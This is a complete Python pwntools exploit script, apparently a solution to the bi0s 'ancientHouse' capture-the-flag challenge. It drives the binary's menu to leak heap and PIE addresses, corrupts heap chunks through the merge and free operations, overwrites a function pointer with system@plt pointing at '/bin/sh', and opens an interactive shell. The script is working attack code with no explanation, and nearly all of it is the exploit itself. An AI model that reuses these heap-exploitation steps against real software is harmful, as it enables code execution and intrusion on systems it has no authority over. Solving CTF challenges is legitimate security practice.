from pwn import *
io = process("./ancientHouse",aslr=False)
#io = remote("pwn.challenge.bi0s.in",1230)

io.recvuntil("Who dares to enter these hallowed halls!! :")
io.sendline("/bin/sh")
io.recvuntil(">>")

def addEnemy(size,name):
    io.sendline("1")
    io.recvuntil("Enter the size :")
    io.sendline(str(size))
    io.recvuntil("Enter name :")
    io.sendline(name)
    io.recvuntil(">>")

def battle(enemyId):
    io.sendline("2")
    io.recvuntil("Enter enemy id :")
    io.sendline(str(enemyId))
    return io.recvuntil(">>")

def merge(id1,id2):
    io.sendline("3")
    io.recvuntil("[+] Enemy id 1:")
    io.sendline(str(id1))
    io.recvuntil("[+] Enemy id 2:")
    io.sendline(str(id2))
    io.recvuntil(">>")

def kill(enemyId,health):
    for i in range(round(health/15)):
        battle(enemyId)

    io.sendline("1")

addEnemy(0x20,"A" * 0x20)
#chunk's object is gonna be overwritten
addEnemy(0x20,b"abcd")

heapLeak = u64(battle(0)[54:60].ljust(8,b"\x00"))
log.info("Heap Leak: " + hex(heapLeak))
functionChunk = heapLeak - 8256 
nameChunk = heapLeak - 12384

kill(0,(0x64-0xf))
addEnemy(0x20,b"A"*0x1c + b"\x00"*4)
addEnemy(0x10,b"B" * 4 + p64(functionChunk) + b"\x64\x00\x00\x00") #ljust?
kill(2,100)
addEnemy(0x10,"A"* 0x10)

merge(4,3)
#free functionChunk
pieLeak = u64(battle(1)[22:28].ljust(8,b"\x00"))
systemPlt = p64(pieLeak - 2578)
log.info("Pie Leak: " + hex(pieLeak))

kill(1,85)
addEnemy(0x50,systemPlt + p64(nameChunk))
io.sendline("7")

io.interactive()
